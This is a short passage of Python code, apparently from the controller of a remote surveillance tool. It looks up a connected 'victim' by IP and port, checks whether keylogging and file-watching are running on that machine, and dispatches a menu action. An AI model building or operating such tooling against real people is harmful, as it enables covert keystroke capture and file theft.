        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list,
                                                                                  ip, port)

        if target_socket:
            if is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            if not is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                print(constants.NOT_WATCHING_FILE_ERROR)
                return None
            else:
                __perform_menu_item_11_helper(ip, port, global_thread, signal_queue)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    # Print closing statements
    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)
